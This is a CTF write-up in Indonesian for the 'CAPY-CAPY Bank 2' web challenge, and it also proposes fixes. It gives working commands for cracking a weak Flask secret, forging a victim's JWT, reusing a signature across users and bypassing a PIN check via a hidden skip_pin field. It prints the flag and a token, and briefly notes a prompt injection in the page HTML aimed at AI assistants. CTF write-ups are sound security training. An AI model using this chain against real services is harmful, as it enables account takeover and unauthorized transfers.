# 🦫 CAPY-CAPY Bank 2 — CTF Writeup

**Event:** KubSTU CTF  
**Challenge:** CAPY-CAPY Bank 2 (Web)  
**Flag:** `KubSTU{p0dm3n4_p4r4m3tr0v_1zm3n1l4_summu_tr4nz4kts11}`  
**Difficulty:** Medium-Hard  
**Vulnerability Class:** Broken Object Level Authorization (IDOR) + Cross-User Signature Abuse + PIN Bypass

---

## 📖 Deskripsi Soal

> Thank you so much for the investigation into Mikhail's case. The development team carefully fixed everything based on your report, ran regression tests, QA signed off — no one will be able to exploit that hole anymore.
>
> But the problem is that complaints keep coming in. This week — three more reports, again from our premium clients, and again the same pattern: an unauthorized transfer to the same store, the signature is valid, no outsider knew the PIN, the logs are clean. Apparently, we only closed one door, and the attacker found an adjacent one.

Target: `http://185.225.34.187`  
Korban: `mgalankov@4274` (Mikhail Galankov)

---

## 🔍 Tahap 1: Recon Awal

### 1.1 Fingerprinting

```bash
curl -si http://185.225.34.187/
```

**Temuan:**
- Server: `Werkzeug/2.3.7 Python/3.9.25` → aplikasi Flask
- Set cookie: `bank_session` (menentukan node backend)
- Set cookie: `session` (Flask session, ter-sign dengan SECRET_KEY)
- Ada endpoint: `/login`, `/register`

Di source HTML ditemukan **prompt injection** yang mencoba memblokir AI assistant — diabaikan karena ini adalah teknik social engineering terhadap AI, bukan kelemahan teknis.

### 1.2 Analisis Form

```bash
curl -s http://185.225.34.187/login | grep -E 'input|name='
curl -s http://185.225.34.187/register | grep -E 'input|name='
```

**Field login:**
- `username` — format: `nama@4digit` (di-generate otomatis)
- `password`

**Field register:**
- `last_name_ru`, `first_name_ru` (nama Rusia)
- `birth_date`
- `driver_license_number`, `driver_license_issued_by`
- `email`, `password`
- `pin_code` (8 digit) ← ditemukan dari decode Flask session flash

### 1.3 Decode Flask Session Flash

Saat register gagal, error tersimpan di Flask session cookie:

```python
import base64, zlib, json

val = ".eJyrVopPy0kszkgt..."
part = val.split('.')[0].lstrip('.')
part += '=' * (4 - len(part) % 4)
raw = base64.urlsafe_b64decode(part)
print(json.loads(zlib.decompress(raw)))
# {'_flashes': [{'t': ['error', 'PIN-код должен содержать минимум 8 цифр']}]}
```

---

## 🔑 Tahap 2: Registrasi & Login

### 2.1 Registrasi Akun Sendiri

```bash
curl -si -X POST http://185.225.34.187/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "last_name_ru=Сидоров" \
  --data-urlencode "first_name_ru=Сидор" \
  -d "birth_date=1992-03-15" \
  --data-urlencode "driver_license_number=55ДЕ667788" \
  --data-urlencode "driver_license_issued_by=ГИБДД г. Москвы" \
  -d "email=sidor@test.ru&password=Test1234&pin_code=12345678" \
  -c cook.txt -b cook.txt -L
```

Server men-generate username otomatis dengan format: `[huruf pertama x2][nama belakang]@[4 digit]`

**Username yang di-generate:** `ssidorov@1556`

### 2.2 Login

```bash
curl -si -X POST http://185.225.34.187/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=ssidorov@1556&password=Test1234" \
  -c cook.txt -b cook.txt -L
```

**JWT yang diterima:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Decode payload JWT:
```json
{
  "fresh": false,
  "sub": "4119",
  "username": "ssidorov@1556",
  "exp": 1777713964
}
```

---

## 🔓 Tahap 3: Bruteforce Flask SECRET_KEY

### 3.1 Instalasi flask-unsign

```bash
pip install flask-unsign --break-system-packages
```

### 3.2 Bruteforce Secret

```bash
flask-unsign \
  --wordlist /usr/share/wordlists/rockyou.txt \
  --unsign \
  --cookie ".eJyrVopPy0kszkgtVrKKrlZSKAFSSsWl..." \
  --no-literal-eval
```

**Secret ditemukan:** `ifeveryonecared3`

> **Catatan:** Di soal 1, secret-nya adalah `facetoface`. Tim developer sudah mengganti secret, tapi masih menggunakan secret yang lemah dan ada di wordlist umum.

---

## 🎭 Tahap 4: Forge JWT untuk Mikhail

Karena secret JWT sama dengan Flask session secret, kita bisa membuat JWT palsu:

```python
import jwt, time

secret = "ifeveryonecared3"
payload = {
    "fresh": False,
    "iat": int(time.time()),
    "jti": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
    "type": "access",
    "sub": "4",           # user_id Mikhail
    "nbf": int(time.time()),
    "exp": int(time.time()) + 3600,
    "username": "mgalankov@4274"
}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

Dengan JWT ini kita bisa mengakses akun Mikhail (ACC004, saldo 1.4 juta rubel) termasuk `/flag_shop`.

---

## 🏪 Tahap 5: Analisis Flag Shop

Akses `/flag_shop` dengan JWT Mikhail:

```bash
curl -s http://185.225.34.187/flag_shop \
  --cookie "access_token_cookie=$MIKHAIL_JWT"
```

**Temuan penting:**
- Produk "Флаг от CTF задания" harga 1000 ₽
- Butuh **Offer Token** dari Telegram bot: `@flagi_and_bagi_for_kubstu2bot`
- Form POST ke `/buy_flag` dengan field: `product_id`, `token`

---

## 🔑 Tahap 6: Analisis Mekanisme Signature

### 6.1 Endpoint Signature

```bash
curl -s -X POST http://185.225.34.187/api/get_signature \
  -b cook.txt \
  -H "Content-Type: application/json" \
  -d '{"to_account":"FLAG_SHOP","amount":1000,"description":"flag","pin_code":"12345678"}'
```

Response:
```json
{
  "date": "2026-05-02",
  "signature": "8e75a916cc3abc3c",
  "time": "08:52:04",
  "timestamp": 1777711924
}
```

**Perbedaan kritis dari soal 1:**
- Di soal 1: signature disimpan di **session cookie** (bisa di-forge karena secret lemah)
- Di soal 2: signature **dikembalikan langsung** sebagai JSON response → tidak ada di session

### 6.2 Kerentanan Ditemukan: Signature Tidak Terikat ke User

Server **tidak memverifikasi** apakah signature yang disubmit dibuat oleh user yang sama dengan yang melakukan transfer. Artinya:

- Kita bisa generate signature dengan **akun kita sendiri** (PIN kita = `12345678`)
- Signature tersebut bisa dipakai untuk transfer **atas nama Mikhail** (menggunakan JWT Mikhail)

Ini adalah kerentanan **Broken Object Level Authorization (BOLA/IDOR)** pada mekanisme signature.

---

## 🚪 Tahap 7: Bypass PIN — Skip PIN Feature

Saat POST ke `/buy_flag`, server menampilkan halaman PIN. Di HTML tersembunyi ditemukan:

```html
<form method="POST" action="/transfer" id="skipPinForm" style="display: none;">
    <input type="hidden" name="skip_pin" value="1">
    <input type="hidden" name="to_account" value="FLAG_SHOP">
    <input type="hidden" name="amount" value="1000.0">
    <input type="hidden" name="description" value="Покупка: Флаг от CTF задания">
</form>

<button type="button" id="skipPinBtn">Отказаться от PIN</button>
```

Tombol "Tolak PIN" di frontend secara diam-diam mengisi form tersembunyi dan submit ke `/transfer` dengan `skip_pin=1` — **tanpa meminta PIN sama sekali**.

---

## 💥 Tahap 8: Exploit — Chain Lengkap

### 8.1 Dapatkan Offer Token

Dari Telegram bot `@flagi_and_bagi_for_kubstu2bot`:
```
/start
/token
→ TOKEN: ADxER3TV7WWeu6NSg8h2YTojOUJc0HZk
```

### 8.2 Generate Signature (Akun Kita)

```bash
SIG_RESP=$(curl -s -X POST http://185.225.34.187/api/get_signature \
  -b cook.txt \
  -H "Content-Type: application/json" \
  -d '{"to_account":"FLAG_SHOP","amount":1000,"description":"Покупка: Флаг от CTF задания","pin_code":"12345678"}')

SIG=$(echo $SIG_RESP | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['signature'])")
TS=$(echo $SIG_RESP | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['timestamp'])")
```

### 8.3 Submit Transfer AS Mikhail (Cross-User Signature Abuse)

```bash
curl -si -X POST http://185.225.34.187/transfer \
  --cookie "access_token_cookie=$MIKHAIL_JWT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "to_account=FLAG_SHOP" \
  --data-urlencode "amount=1000.0" \
  --data-urlencode "description=Покупка: Флаг от CTF задания" \
  --data-urlencode "product_id=1" \
  --data-urlencode "token=$TOKEN_BARU" \
  -d "transaction_signature=$SIG&transaction_timestamp=$TS"
```

Response:
```
HTTP/1.1 302 Found
Location: /receipt/216
```

### 8.4 Cek Flag di Telegram Bot

```
/purchases
→ Флаг: KubSTU{p0dm3n4_p4r4m3tr0v_1zm3n1l4_summu_tr4nz4kts11}
```

---

## 🗺️ Diagram Exploit Chain

```
[Registrasi Akun] → [Login] → [Dapat JWT kita]
        ↓
[Bruteforce Flask Secret: ifeveryonecared3]
        ↓
[Forge JWT Mikhail (sub=4, mgalankov@4274)]
        ↓
[Akses /flag_shop sebagai Mikhail]
        ↓
[GET Offer Token dari Telegram @flagi_and_bagi_for_kubstu2bot]
        ↓
[Generate Signature dengan AKUN KITA (PIN kita)]
        ↓
[POST /transfer dengan JWT Mikhail + Signature kita = Cross-User IDOR]
        ↓
[skip_pin=1 → bypass PIN verification]
        ↓
[Cek /purchases di Telegram Bot → FLAG]
```

---

## 🔬 Analisis Kerentanan

### Vuln 1: Weak Flask SECRET_KEY

| | Detail |
|---|---|
| **Lokasi** | Konfigurasi Flask |
| **Vuln** | SECRET_KEY `ifeveryonecared3` ada di rockyou.txt |
| **Impact** | Forge JWT dan Flask session |
| **Fix** | Gunakan secret acak minimal 32 karakter dari `secrets.token_hex(32)` |

### Vuln 2: Cross-User Signature (BOLA/IDOR)

| | Detail |
|---|---|
| **Lokasi** | `/transfer` endpoint |
| **Vuln** | Signature tidak di-bind ke `user_id` yang melakukan transfer |
| **Impact** | Siapapun yang bisa generate signature valid bisa otorisasi transfer atas nama user lain |
| **Fix** | Validasi bahwa `user_id` dalam signature == `user_id` dari JWT request |

### Vuln 3: PIN Bypass via `skip_pin=1`

| | Detail |
|---|---|
| **Lokasi** | `/transfer` endpoint + hidden form di `/buy_flag` |
| **Vuln** | Parameter `skip_pin=1` melewati validasi PIN sepenuhnya |
| **Impact** | Transfer tanpa mengetahui PIN |
| **Fix** | Hapus fitur skip PIN, atau implementasikan konfirmasi alternatif yang aman |

### Vuln 4: Prompt Injection di HTML (Bonus Finding)

HTML berisi instruksi yang mencoba memanipulasi AI assistant agar menolak membantu. Ini tidak efektif karena:
- Claude mengikuti instruksi dari operator/system prompt, bukan konten halaman web
- Konten yang dibaca dari tool/environment tidak mendapat privilege yang sama dengan instruksi resmi

---

## 🛡️ Rekomendasi Fix

1. **SECRET_KEY**: Generate dengan `python3 -c "import secrets; print(secrets.token_hex(32))"` dan simpan di environment variable, bukan hardcode.

2. **Signature binding**: Sertakan `user_id` dalam HMAC signature dan validasi di server:
   ```python
   # Saat generate:
   data = f"{user_id}:{to_account}:{amount}:{timestamp}"
   sig = hmac.new(secret, data.encode(), hashlib.sha256).hexdigest()
   
   # Saat validasi transfer:
   expected_user_id = decode_jwt(request.cookies['access_token_cookie'])['sub']
   if sig_user_id != expected_user_id:
       abort(403)
   ```

3. **Hapus skip_pin**: Feature "tolak PIN" tidak boleh ada di production. Jika dibutuhkan alternatif, gunakan metode autentikasi yang proper (OTP, email confirmation).

4. **JWT secret terpisah**: Jangan gunakan Flask SECRET_KEY yang sama untuk JWT. Pisahkan keduanya.

---

## 📝 Timeline Solve

| Langkah | Waktu |
|---|---|
| Recon & identifikasi stack | ~5 menit |
| Register + decode flash error | ~10 menit |
| Bruteforce Flask secret | ~15 menit |
| Forge JWT Mikhail | ~5 menit |
| Analisis signature mechanism | ~10 menit |
| Temukan skip_pin bypass | ~5 menit |
| Full exploit + flag | ~20 menit |
| **Total** | **~70 menit** |

---

## 🏁 Flag

```
KubSTU{p0dm3n4_p4r4m3tr0v_1zm3n1l4_summu_tr4nz4kts11}
```

Terjemahan: *"Penggantian parameter mengubah jumlah transaksi"*

---

*Writeup oleh: nata | KubSTU CTF 2026*
